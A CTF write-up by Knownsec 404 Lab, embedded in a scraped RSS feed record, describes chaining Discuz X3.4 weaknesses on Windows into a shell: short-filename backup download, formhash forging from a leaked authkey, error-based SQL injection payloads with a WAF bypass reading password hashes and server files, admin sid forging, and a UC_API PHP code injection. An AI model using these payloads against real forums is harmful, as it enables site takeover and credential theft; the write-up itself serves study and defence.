"https://images.seebug.org/content/images/2020/04/56d63d18-aa30-4fbf-93eb-c6bc79bca824.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn51@2020_1/2020/08/24/21-14-54-519_8a9115724c6ae261.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688715},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"空指针-Base on windows Writeup — 最新版DZ3.4实战渗透","link":"https://blog.knownsec.com/?p=5013","description":"\n<p><strong>作者：LoRexxar'@知道创宇404实验室<br>时间：2020年5月11日</strong><br><strong>英文链接：&#160;<a href=\"https://paper.seebug.org/1205/\">https://paper.seebug.org/1205/</a></strong></p>\n\n\n\n<p>周末看了一下这次空指针的第三次Web公开赛，稍微研究了下发现这是一份最新版DZ3.4几乎默认配置的环境，我们需要在这样一份几乎真实环境下的DZ中完成Get shell。这一下子提起了我的兴趣，接下来我们就一起梳理下这个渗透过程。</p>\n\n\n\n<p>与默认环境的区别是，我们这次拥有两个额外的条件。</p>\n\n\n\n<p>1、Web环境的后端为Windows<br>2、我们获得了一份config文件，里面有最重要的authkey</p>\n\n\n\n<p>得到这两个条件之后，我们开始这次的渗透过程。</p>\n\n\n\n<p>以下可能会多次提到的出题人写的DZ漏洞整理</p>\n\n\n\n<ul><li><a href=\"https://paper.seebug.org/1144/\">这是一篇“不一样”的真实渗透测试案例分析文章</a></li></ul>\n\n\n\n<h1 id=\"authkey\">authkey有什么用？</h1>\n\n\n\n<pre class=\"crayon-plain-tag\">/ -------------------------  CONFIG SECURITY  -------------------------- //\n$_config['security']['authkey'] = '87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E';</pre>\n\n\n\n<p>authkey是DZ安全体系里最重要的主密钥，在DZ本体中，涉及到密钥相关的，基本都是用<code>authkey</code>和cookie中的saltkey加密构造的。</p>\n\n\n\n<p>当我们拥有了这个authkey之后，我们可以计算DZ本体各类操作相关的formhash（DZ所有POST相关的操作都需要计算formhash）</p>\n\n\n\n<p>配合authkey，我们可以配合<code>source/include/misc/misc_emailcheck.php</code>中的修改注册邮箱项来修改任意用户绑定的邮箱，但管理员不能使用修改找回密码的api。</p>\n\n\n\n<p>可以用下面的脚本计算formhash</p>\n\n\n\n<pre class=\"crayon-plain-tag\">$username = &#34;ddog&#34;;\n$uid = 51;\n$saltkey = &#34;SuPq5mmP&#34;;\n$config_authkey = &#34;87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E&#34;;\n$authkey = md5($config_authkey.$saltkey);\n$formhash = substr(md5(substr($t, 0, -7).$username.$uid.$authkey.&#34;&#34;.&#34;&#34;), 8, 8);</pre>\n\n\n\n<p>当我们发现光靠authkey没办法进一步渗透的时候，我们把目标转回到hint上。</p>\n\n\n\n<p>1、Web环境的后端为Windows<br>2、<strong>dz有正常的备份数据，备份数据里有重要的key值</strong></p>\n\n\n\n<h1 id=\"windows\">windows短文件名安全问题</h1>\n\n\n\n<p>在2019年8月，dz曾爆出过这样一个问题。</p>\n\n\n\n<ul><li><a href=\"https://gitee.com/ComsenzDiscuz/DiscuzX/issues/I10NG9\">windows短文件名安全问题 数据库备份爆破</a></li></ul>\n\n\n\n<p>在windows环境下，有许多特殊的有关通配符类型的文件名展示方法，其中不仅仅有&#160;<code>&#60;&#62;\"</code>这类可以做通配符的符号，还有类似于<code>~</code>的省略写法。这个问题由于问题的根在服务端，所以cms无法修复，所以这也就成了一个长久的问题存在。</p>\n\n\n\n<p>具体的细节可以参考下面这篇文章：</p>\n\n\n\n<ul><li><a href=\"https://18.163.237.232xz.aliyun.com/t/2318#toc-6\">Windows下的\"你画我猜\" -- 告别效率低下的目录扫描方法</a></li></ul>\n\n\n\n<p>配合这两篇文章，我们可以直接去读数据库的备份文件，这个备份文件存在</p>\n\n\n\n<pre class=\"crayon-plain-tag\">/data/backup_xxxxxx/200509_xxxxxx-1.sql</pre>\n\n\n\n<p>我们可以直接用</p>\n\n\n\n<pre class=\"crayon-plain-tag\">http://xxxxx/data/backup~1/200507~2.sql</pre>\n\n\n\n<p>拿到数据库文件</p>\n\n\n\n<p>从数据库文件中，我们可以找到UC_KEY(dz)</p>\n\n\n\n<p>在<code>pre_ucenter_applications</code>的authkey字段找到UC_KEY(dz)</p>\n\n\n\n<p>至此我们得到了两个信息：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">uckey\n\nx9L1efE1ff17a4O7i158xcSbUfo1U2V7Lebef3g974YdG4w0E2LfI4s5R1p2t4m5\n\nauthkey\n\n87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E</pre>\n\n\n\n<p>当我们有了这两个key之后，我们可以直接调用uc_client的uc.php任意api。，后面的进一步利用也是建立在这个基础上。</p>\n\n\n\n<h1 id=\"ucphp-api\">uc.php api 利用</h1>\n\n\n\n<p>这里我们主要关注<code>/api/uc.php</code></p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/963cac98-1537-4689-a928-9af2dc53bf74.png-w331s\" alt=\" \" /></figure>\n\n\n\n<p>通过<code>UC_KEY</code>来计算code，然后通过<code>authkey</code>计算formhash，我们就可以调用当前api下的任意函数，而在这个api下有几个比较重要的操作。</p>\n\n\n\n<p>我们先把目光集中到<code>updateapps</code>上来，这个函数的特殊之处在于由于DZ直接使用<code>preg_replace</code>替换了<code>UC_API</code>，可以导致后台的getshell。</p>\n\n\n\n<p>具体详细分析可以看，这个漏洞最初来自于@dawu，我在CSS上的演讲中提到过这个后台getshell：</p>\n\n\n\n<ul><li><a href=\"https://paper.seebug.org/1144/#getwebshell\">https://paper.seebug.org/1144/#getwebshell</a></li><li><a href=\"https://lorexxar.cn/2020/01/14/css-mysql-chain/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB-with-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2\">https://lorexxar.cn/2020/01/14/css-mysql-chain/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB-with-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2</a></li></ul>\n\n\n\n<p>根据这里的操作，我们可以构造<code>$code = 'time='.time().'&#38;action=updateapps';</code></p>\n\n\n\n<p>来触发updateapps，可以修改配置中的<code>UC_API</code>，但是在之前的某一个版本更新中，这里加入了条件限制。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">if($post['UC_API']) {\n    $UC_API = str_replace(array('\\'', '&#34;', '\\\\', &#34;\\0&#34;, &#34;\\n&#34;, &#34;\\r&#34;), '', $post['UC_API']);\n    unset($post['UC_API']);\n}</pre>\n\n\n\n<p>由于过滤了单引号，导致我们注入的uc api不能闭合引号，所以单靠这里的api我们没办法完成getshell。</p>\n\n\n\n<p>换言之，我们必须登录后台使用后台的修改功能，才能配合getshell。至此，我们的渗透目标改为如何进入后台。</p>\n\n\n\n<h1 id=\"dz\">如何进入DZ后台？</h1>\n\n\n\n<p>首先我们必须明白，DZ的前后台账户体系是分离的，包括uc api在内的多处功能，login都只能登录前台账户，</p>\n\n\n\n<p>也就是说，进入DZ的后台的唯一办法就是必须知道DZ的后台密码，而这个密码是不能通过前台的忘记密码来修改的，所以我们需要寻找办法来修改密码。</p>\n\n\n\n<p>这里主要有两种办法，也对应两种攻击思路：</p>\n\n\n\n<p>1、配合报错注入的攻击链<br>2、使用数据库备份还原修改密码</p>\n\n\n\n<h2 id=\"1\">1、配合报错注入的攻击链</h2>\n\n\n\n<p>继续研究uc.php，我在renameuser中找到一个注入点。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">function renameuser($get, $post) {\n        global $_G;\n\n        if(!API_RENAMEUSER) {\n            return API_RETURN_FORBIDDEN;\n        }\n\n\n\n        $tables = array(\n            'common_block' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'common_invite' =&#38;gt; array('id' =&#38;gt; 'fuid', 'name' =&#38;gt; 'fusername'),\n            'common_member_verify_info' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'common_mytask' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'common_report' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n\n            'forum_thread' =&#38;gt; array('id' =&#38;gt; 'authorid', 'name' =&#38;gt; 'author'),\n            'forum_activityapply' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'forum_groupuser' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'forum_pollvoter' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'forum_post' =&#38;gt; array('id' =&#38;gt; 'authorid', 'name' =&#38;gt; 'author'),\n            'forum_postcomment' =&#38;gt; array('id' =&#38;gt; 'authorid', 'name' =&#38;gt; 'author'),\n            'forum_ratelog' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n\n            'home_album' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_blog' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_clickuser' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_docomment' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_doing' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_feed' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_feed_app' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_friend' =&#38;gt; array('id' =&#38;gt; 'fuid', 'name' =&#38;gt; 'fusername'),\n            'home_friend_request' =&#38;gt; array('id' =&#38;gt; 'fuid', 'name' =&#38;gt; 'fusername'),\n            'home_notification' =&#38;gt; array('id' =&#38;gt; 'authorid', 'name' =&#38;gt; 'author'),\n            'home_pic' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_poke' =&#38;gt; array('id' =&#38;gt; 'fromuid', 'name' =&#38;gt; 'fromusername'),\n            'home_share' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_show' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_specialuser' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'home_visitor' =&#38;gt; array('id' =&#38;gt; 'vuid', 'name' =&#38;gt; 'vusername'),\n\n            'portal_article_title' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'portal_comment' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'portal_topic' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n            'portal_topic_pic' =&#38;gt; array('id' =&#38;gt; 'uid', 'name' =&#38;gt; 'username'),\n        );\n\n        if(!C::t('common_member')-&#38;gt;update($get['uid'], array('username' =&#38;gt; $get[newusername])) &#38;amp;&#38;amp; isset($_G['setting']['membersplit'])){\n            C::t('common_member_archive')-&#38;gt;update($get['uid'], array('username' =&#38;gt; $get[newusername]));\n        }\n\n        loadcache(&#34;posttableids&#34;);\n        if($_G['cache']['posttableids']) {\n            foreach($_G['cache']['posttableids'] AS $tableid) {\n                $tables[getposttable($tableid)] = array('id' =&#38;gt; 'authorid', 'name' =&#38;gt; 'author');\n            }\n        }\n\n        foreach($tables as $table =&#38;gt; $conf) {\n            DB::query(&#34;UPDATE &#34;.DB::table($table).&#34; SET `$conf[name]`='$get[newusername]' WHERE `$conf[id]`='$get[uid]'&#34;);\n        }\n        return API_RETURN_SUCCEED;\n    }</pre>\n\n\n\n<p>在函数的最下面，<code>$get[newusername]</code>被直接拼接进了update语句中。</p>\n\n\n\n<p>但可惜的是，这里链接数据库默认使用mysqli，并不支持堆叠注入，所以我们没办法直接在这里执行update语句来更新密码，这里我们只能构造报错注入来获取数据。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">$code = 'time='.time().'&#38;amp;action=renameuser&#38;amp;uid=1&#38;amp;newusername=ddog\\',name=(\\'a\\' or updatexml(1,concat(0x7e,(/*!00000select*/ substr(password,0) from pre_ucenter_members where uid = 1 limit 1)),0)),title=\\'a';</pre>\n\n\n\n<p>这里值得注意的是，DZ自带的注入waf挺奇怪的，核心逻辑在</p>\n\n\n\n<pre class=\"crayon-plain-tag\">\\source\\class\\discuz\\discuz_database.php line 375\n\nif (strpos($sql, '/') === false &#38;amp;&#38;amp; strpos($sql, '#') === false &#38;amp;&#38;amp; strpos($sql, '-- ') === false &#38;amp;&#38;amp; strpos($sql, '@') === false &#38;amp;&#38;amp; strpos($sql, '`') === false &#38;amp;&#38;amp; strpos($sql, '&#34;') === false) {\n            $clean = preg_replace(&#34;/'(.+?)'/s&#34;, '', $sql);\n        } else {\n            $len = strlen($sql);\n            $mark = $clean = '';\n            for ($i = 0; $i &#38;lt; $len; $i++) {\n                $str = $sql[$i];\n                switch ($str) {\n                    case '`':\n                        if(!$mark) {\n                            $mark = '`';\n                            $clean .= $str;\n                        } elseif ($mark == '`') {\n                            $mark = '';\n                        }\n                        break;\n                    case '\\'':\n                        if (!$mark) {\n                            $mark = '\\'';\n                            $clean .= $str;\n                        } elseif ($mark == '\\'') {\n                            $mark = '';\n                        }\n                        break;\n                    case '/':\n                        if (empty($mark) &#38;amp;&#38;amp; $sql[$i + 1] == '*') {\n                            $mark = '/*';\n                            $clean .= $mark;\n                            $i++;\n                        } elseif ($mark == '/*' &#38;amp;&#38;amp; $sql[$i - 1] == '*') {\n                            $mark = '';\n                            $clean .= '*';\n                        }\n                        break;\n                    case '#':\n                        if (empty($mark)) {\n                            $mark = $str;\n                            $clean .= $str;\n                        }\n                        break;\n                    case &#34;\\n&#34;:\n                        if ($mark == '#' || $mark == '--') {\n                            $mark = '';\n                        }\n                        break;\n                    case '-':\n                        if (empty($mark) &#38;amp;&#38;amp; substr($sql, $i, 3) == '-- ') {\n                            $mark = '-- ';\n                            $clean .= $mark;\n                        }\n                        break;\n\n                    default:\n\n                        break;\n                }\n                $clean .= $mark ? '' : $str;\n            }\n        }\n\n        if(strpos($clean, '@') !== false) {\n            return '-3';\n        }\n\n        $clean = preg_replace(&#34;/[^a-z0-9_\\-\\(\\)#\\*\\/\\&#34;]+/is&#34;, &#34;&#34;, strtolower($clean));\n\n        if (self::$config['afullnote']) {\n            $clean = str_replace('/**/', '', $clean);\n        }\n\n\n        if (is_array(self::$config['dfunction'])) {\n            foreach (self::$config['dfunction'] as $fun) {\n                if (strpos($clean, $fun . '(') !== false)\n                    return '-1';\n            }\n        }\n\n        if (is_array(self::$config['daction'])) {\n            foreach (self::$config['daction'] as $action) {\n                if (strpos($clean, $action) !== false)\n                    return '-3';\n            }\n        }       \n\n        if (self::$config['dlikehex'] &#38;amp;&#38;amp; strpos($clean, 'like0x')) {\n            return '-2';\n        }\n\n        if (is_array(self::$config['dnote'])) {\n            foreach (self::$config['dnote'] as $note) {\n                if (strpos($clean, $note) !== false)\n                    return '-4';\n            }\n        }</pre>\n\n\n\n<p>然后config中相关的配置为</p>\n\n\n\n<pre class=\"crayon-plain-tag\">$_config['security']['querysafe']['dfunction']['0'] = 'load_file';\n$_config['security']['querysafe']['dfunction']['1'] = 'hex';\n$_config['security']['querysafe']['dfunction']['2'] = 'substring';\n$_config['security']['querysafe']['dfunction']['3'] = 'if';\n$_config['security']['querysafe']['dfunction']['4'] = 'ord';\n$_config['security']['querysafe']['dfunction']['5'] = 'char';\n$_config['security']['querysafe']['daction']['0'] = '@';\n$_config['security']['querysafe']['daction']['1'] = 'intooutfile';\n$_config['security']['querysafe']['daction']['2'] = 'intodumpfile';\n$_config['security']['querysafe']['daction']['3'] = 'unionselect';\n$_config['security']['querysafe']['daction']['4'] = '(select';\n$_config['security']['querysafe']['daction']['5'] = 'unionall';\n$_config['security']['querysafe']['daction']['6'] = 'uniondistinct';\n$_config['security']['querysafe']['dnote']['0'] = '/*';\n$_config['security']['querysafe']['dnote']['1'] = '*/';\n$_config['security']['querysafe']['dnote']['2'] = '#';\n$_config['security']['querysafe']['dnote']['3'] = '--';\n$_config['security']['querysafe']['dnote']['4'] = '&#34;';</pre>\n\n\n\n<p>这道题目特殊的地方在于，他开启了<code>afullnote</code></p>\n\n\n\n<pre class=\"crayon-plain-tag\">if (self::$config['afullnote']) {\n        $clean = str_replace('/**/', '', $clean);\n    }</pre>\n\n\n\n<p>由于<code>/**/</code>被替换为空，所以我们可以直接用前面的逻辑把select加入到这中间，之后被替换为空，就可以绕过这里的判断。</p>\n\n\n\n<p>当我们得到一个报错注入之后，我们尝试读取文件内容，发现由于mysql是<code>5.5.29</code>，所以我们可以直接读取服务器上的任意文件。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">$code = 'time='.time().'&#38;amp;action=renameuser&#38;amp;uid=1&#38;amp;newusername=ddog\\',name=(\\'a\\' or updatexml(1,concat(0x7e,(/*!00000select*/ /*!00000load_file*/(\\'c:/windows/win.ini\\') limit 1)),0)),title=\\'a';</pre>\n\n\n\n<p>思路走到这里出现了断层，因为我们没办法知道web路径在哪里，所以我们没办法直接读到web文件，这里我僵持了很久，最后还是因为第一个人做出题目后密码是弱密码，我直接查出来进了后台。</p>\n\n\n\n<p>在事后回溯的过程中，发现还是有办法的，虽然说对于windows来说，web的路径很灵活，但是实际上对于集成环境来说，一般都安装在c盘下，而且一般人也不会去动服务端的路径。常见的windows集成环境主要有phpstudy和wamp，这两个路径分别为</p>\n\n\n\n<pre class=\"crayon-plain-tag\">- /wamp64/www/\n- /phpstudy_pro/WWW/</pre>\n\n\n\n<p>找到相应的路径之后，我们可以读取<code>\\uc_server\\data\\config.inc.php</code>得到uc server的<code>UC_KEY</code>.</p>\n\n\n\n<p>之后我们可以直接调用<code>/uc_server/api/dpbak.php</code>中定义的</p>\n\n\n\n<pre class=\"crayon-plain-tag\">function sid_encode($username) {\n        $ip = $this-&#38;gt;onlineip;\n        $agent = $_SERVER['HTTP_USER_AGENT'];\n        $authkey = md5($ip.$agent.UC_KEY);\n        $check = substr(md5($ip.$agent), 0, 8);\n        return rawurlencode($this-&#38;gt;authcode(&#34;$username\\t$check&#34;, 'ENCODE', $authkey, 1800));\n    }\n\n    function sid_decode($sid) {\n        $ip = $this-&#38;gt;onlineip;\n        $agent = $_SERVER['HTTP_USER_AGENT'];\n        $authkey = md5($ip.$agent.UC_KEY);\n        $s = $this-&#38;gt;authcode(rawurldecode($sid), 'DECODE', $authkey, 1800);\n        if(empty($s)) {\n            return FALSE;\n        }\n        @list($username, $check) = explode(&#34;\\t&#34;, $s);\n        if($check == substr(md5($ip.$agent), 0, 8)) {\n            return $username;\n        } else {\n            return FALSE;\n        }\n    }</pre>\n\n\n\n<p>构造管理员的sid来绕过权限验证，通过这种方式我们可以修改密码并登录后台。</p>\n\n\n\n<h2 id=\"2\">2、使用数据库备份还原修改密码</h2>\n\n\n\n<p>事实上，当上一种攻击方式跟到uc server的<code>UC_KEY</code>时，就不难发现，在<code>/uc_server/api/dbbak.php</code>中有许多关于数据库备份与恢复的操作，这也是我之前没发现的点。</p>\n\n\n\n<p>事实上，在<code>/api/dbbak.php</code>就有一模一样的代码和功能，而那个api只需要DZ的<code>UC_KEY</code>就可以操作，我们可以在前台找一个地方上传，然后调用备份恢复覆盖数据库文件，这样就可以修改管理员的密码。</p>\n\n\n\n<h1 id=\"getshell\">后台getshell</h1>\n\n\n\n<p>登录了之后就比较简单了，首先</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/815358e5-e926-4bdf-94c6-a953bd8bd779.png-w331s\" alt=\" \" /></figure>\n\n\n\n<p>修改uc api 为</p>\n\n\n\n<pre class=\"crayon-plain-tag\">http://127.0.0.1/uc_server');phpinfo();//</pre>\n\n\n\n<p>然后使用预先准备poc更新uc api</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/17d06789-0552-4101-96a3-29572e57f10d.png-w331s\" alt=\" \" /></figure>\n\n\n\n<p>这里返回11就可以了</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/015d6bdd-dbfa-45a5-9085-bd0fe5343076.png-w331s\" alt=\" \" /></figure>\n\n\n\n<h1 id=\"_1\">写在最后</h1>\n\n\n\n<p>整道题目主要围绕的DZ的核心密钥安全体系，实际上除了在windows环境下，几乎没有其他的特异条件，再加上短文件名问题原因主要在服务端，我们很容易找到备份文件，在找到备份文件之后，我们可以直接从数据库获得最重要的authkey和uc key，接下来的渗透过程就顺理成章了。</p>\n\n\n\n<p>从这篇文章中，你也可以窥得在不同情况下利用方式得拓展，配合原文阅读可以获得更多的思路。</p>\n\n\n\n<h1 id=\"ref\">REF</h1>\n\n\n\n<ul><li><a href=\"https://paper.seebug.org/1144/\">https://paper.seebug.org/1144/</a></li><li><a href=\"https://lorexxar.cn/2020/01/14/css-mysql-chain/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB-with-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2\">https://lorexxar.cn/2020/01/14/css-mysql-chain/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB-with-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2</a></li><li><a href=\"https://lorexxar.cn/2017/08/31/dz-authkey/\">https://lorexxar.cn/2017/08/31/dz-authkey/</a></li></ul>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1197/\">https://paper.seebug.org/1197/</a></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:22:23 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/05/963cac98-1537-4689-a928-9af2dc53bf74.png-w331s","linkMd5":"c8d4535c12d7f5a007abcd8ebe8e7714","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn46@2020_2/2020/08/24/21-14-50-813_507d44d96751d671.webp","destWidth":704,"destHeight":701,"sourceBytes":39968,"destBytes":55972,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/05/963cac98-1537-4689-a928-9af2dc53bf74.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn46@2020_2/2020/08/24/21-14-50-813_507d44d96751d671.webp","https://images.seebug.org/content/images/2020/05/815358e5-e926-4bdf-94c6-a953bd8bd779.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn15@2020_5/2020/08/24/21-15-01-245_07c2ed8dc001ca42.webp","https://images.seebug.org/content/images/2020/05/17d06789-0552-4101-96a3-29572e57f10d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn98@2020_3/2020/08/24/21-14-53-151_811b456421f39fcf.webp","https://images.seebug.org/content/images/2020/05/015d6bdd-dbfa-45a5-9085-bd0fe5343076.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn34@2020_2/2020/08/24/21-14-53-945_335d24840c3fb979.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688715}],"record":{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","feedId":2536,"fetchDate":"Mon, 24 Aug 2020 21:14:48 +0000","fetchMs":5645,"handleMs":5731,"totalMs":157203,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"54.205.143.171","hostName":"us-033.herokuapp.com","requestId":"d2c5d134046d42878d49e0f8c83b17aa_2536","contentType":"application/rss+xml; charset=UTF-8","totalBytes":17808436,"bgimgsTotal":10,"bgimgsGithubTotal":10,"articlesImgsTotal":204,"articlesImgsGithubTotal":201,"successGithubMap":{"myreaderx14":7,"myreaderx8":6,"myreaderx15":7,"myreaderx7":7,"myreaderx6":8,"myreaderx16":6,"myreaderx10":8,"myreaderx4":8,"myreaderx32":6,"myreaderx33":6,"myreaderx3":7,"myreaderx11":7,"myreaderx2":7,"myreaderx12":7,"myreaderx13":7,"myreaderx1":7,"myreaderx30":7,"myreaderx31":7,"myreaderx18":7,"myreaderx19":7,"myreaderx":6,"myreaderx25":7,"myreaderx27":7,"myreaderx21":7,"myreaderx22":7,"myreaderx23":7,"myreaderx24":7,"myreaderx5oss":7,"myreaderx29":7},"failGithubMap":{}},"feed":{"createdTime":"2020-08-24 21:31:41","updatedTime":"2020-08-24 21:31:41","id":2536,"name":"知道创宇","url":"http://blog.knownsec.com/feed/","subscriber":null,"website":null,"icon":"https://blog.knownsec.com/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx63/cdn34@2020_2/2020/08/24/21-14-47-813_e9675783fe98a911.ico","description":"更好更安全的互联网","weekly":null,"link":"https://blog.knownsec.com"},"noPictureArticleList":[{"createdTime":"2020-08-25 05:17:13","updatedTime":"2020-08-25 05:17:13","id":null,"feedId":2536,"linkMd5":"00b4fc44d295b8070944202e12783d61"},{"createdTime":"2020-08-25 05:17:13","updatedTime":"2020-08-25 05:17:13","id":null,"feedId":2536,"linkMd5":"85885b4354ee52f93eb5242e82c5fd02"},{"createdTime":"2020-08-25 05:17:13","updatedTime":"2020-08-25 05:17:13","id":null,"feedId":2536,"linkMd5":"76d99b92fc03ec11de8661e415c762e4"}],"tmpCommonImgCdnBytes":702134,"tmpBodyImgCdnBytes":17106302,"tmpBgImgCdnBytes":0,"extra4":{"start":1598303676393,"total":0,"statList":[{"spend":6597,"msg":"获取xml内容"},{"spend":5731,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":141376,"msg":"正文链接上传到cdn"}]},"extra5":204,"extra6":202,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/09/1586397401000-32.png-w331s","sourceStatusCode":400,"sourceBytes":0,"destBytes":0,"feedId":2536,"totalSpendMs":588,"convertSpendMs":0,"createdTime":"2020-08-25 05:14:56","host":"europe64*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[400],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/09/1586397401000-32.png-w331s","sourceStatusCode":400,"sourceBytes":0,"destBytes":0,"feedId":2536,"totalSpendMs":207,"convertSpendMs":0,"createdTime":"2020-08-25 05:14:57","host":"us-038*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[400],"sourceSize":"0","destSize":"0"},null,null,null,null],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-032.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-037.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-028.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":9,"resultList":[200,200,200,200,200,200,200,200,200]},"http://us-011.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-025.herokuapp.com/":{"failCount":0,"successCount":7,"resultList":[200,200,200,200,200,200,200]},"http://us-020.herokuapp.com/":{"failCount":0,"successCount":5,"resultList":[200,200,200,200,200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-54.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-004.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe64.herokuapp.com/":{"failCount":1,"successCount":6,"resultList":[200,200,200,200,200,400,200]},"http://europe-22.herokuapp.com/":{"failCount":0,"successCount":7,"resultList":[200,200,200,200,200,200,200]},"http://us-016.herokuapp.com/":{"failCount":1,"successCount":2,"resultList":[200,200,null]},"http://us-013.herokuapp.com/":{"failCount":1,"successCount":8,"resultList":[200,200,200,200,200,200,200,200,null]},"http://us-55.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-009.herokuapp.com/":{"failCount":0,"successCount":7,"resultList":[200,200,200,200,200,200,200]},"http://us-030.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-026.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-001.herokuapp.com/":{"failCount":0,"successCount":8,"resultList":[200